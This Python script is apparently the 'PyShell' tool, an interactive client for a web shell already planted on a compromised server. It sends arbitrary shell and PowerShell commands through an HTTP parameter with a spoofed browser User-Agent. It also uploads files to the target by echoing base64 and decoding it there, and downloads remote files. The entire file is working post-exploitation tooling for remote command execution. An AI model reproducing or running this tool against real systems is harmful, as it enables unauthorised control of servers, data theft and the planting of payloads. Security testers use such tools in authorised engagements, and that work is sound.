#!/usr/bin/python3
import sys, os
import requests
import readline
import argparse
import base64
from termcolor import colored

def send_command(command, webshell, method, param="code"):
   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
   params = {param.strip():command.strip()}
   if (method.upper() == "GET"):
      response = requests.get((webshell), params=params, headers=headers)
   elif (method.upper() == "POST"):
      response = requests.post((webshell), data=params, headers=headers)
   return response.content.decode(errors='ignore')

if __name__ == "__main__":
 banner = """
  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
 ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
 ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒█▒░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

 --------------- by @JoelGMSec & @3v4Si0N ---------------

 """

print (colored(banner, 'green'))
parser = argparse.ArgumentParser()
parser.add_argument('url', help='Webshell URL', type=str)
parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
parser.add_argument('--ps', default=False, action="store_true", help='PowerShell command execution (Only on Windows hosts)')
parser.add_argument('-p', '--param', default="code", help='Parameter to use with custom WebShell', type=str)
args = parser.parse_args()

try:
    WEBSHELL = args.url
    HTTP_METHOD = args.method
    PARAM = args.param
    COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
    whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
    hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)
    cwd = "" ; slash = '\\'
    if not slash in whoami:
       path = send_command('pwd', WEBSHELL, HTTP_METHOD, PARAM)
       system = "linux" ; slash = '/'
    else:
       path = send_command('(pwd).path', WEBSHELL, HTTP_METHOD, PARAM)
       system = "windows"

    while True:
       try:
          print (colored(" [PyShell] ", "grey", "on_green"), end = '') ; print (colored(" ", "green", "on_blue"), end = '')
          print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = '')
          print (colored(" ", "blue", "on_yellow"), end = '') ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = '')
          print (colored(" ", "yellow"), end = '')
          command = input()
          if command == "exit":
             print (colored("Exiting..\n", "red"))
             break
          else:
             if len(command) == 0:
                print("\n")
                continue
             if "clear" in command.split()[0] or "cls" in command.split()[0]:
                os.system('clear')
                continue
             if "upload" in command.split()[0]: 
                localfile = command.split()[1]
                remotefile = command.split()[2]
                remotefiletmp = remotefile.rstrip() + ".tmp"
                if not slash in remotefile:
                   remotefile = path.rstrip() + slash + command.split()[2]
                if not slash in remotefiletmp:
                   remotefiletmp = path.rstrip() + slash + command.split()[2] + ".tmp"
                if not slash in localfile:
                   cwd = os.getcwd()
                print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
                f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
                upload = send_command("echo " + str(base64data.rstrip(), "utf-8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                if system == "linux":
                   send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                if system == "windows":
                   send_command("$base64 = cat -raw " + remotefiletmp + " ; [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($base64)) > " +
                   remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
             else:
                if "download" in command.split()[0]: 
                   remotefile = command.split()[1]
                   localfile = command.split()[2]
                   if not slash in remotefile:
                      remotefile = path.rstrip() + slash + command.split()[1]
                   if not slash in localfile:
                      cwd = os.getcwd()
                   print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                   download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   f = open(localfile, "w")
                   f.write(download)
                   f.close()
                else:
                   if "cd" in command.split()[0]:
                      if ".." in command.split()[1]:
                         path = path.split(slash)[:-1]
                         path = (slash.join(path))
                      else:
                         if not slash in command.split()[1]:
                            path = path.rstrip() + slash + command.split()[1]
                         else:
                            path = command.split()[1]   
                   else:
                      if command.split()[0] in COMMAND_LIST:
                        command_array = command.split(" ")
                        param = ""
                        for i in list(command_array):
                            if i.startswith("-"):
                                param += i + " "
                                command_array.remove(i)
                        cmd = command_array.pop(0)
                        if len(command_array) == 0:
                            relative_path = ""
                        else:
                            relative_path = command_array[0]
                        if not relative_path.startswith(slash):
                          command = cmd + " " + param + path.rstrip() + slash + relative_path

                        content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                        print (colored(content, "yellow"))

                      else:
                        if args.ps:
                           content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                           print (colored(content, "yellow"))
                        else:
                           content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                           print (colored(content, "yellow"))

       except KeyboardInterrupt:
          print (colored("\nExiting..\n", "red"))
          break

except Exception as e:
   print(e)
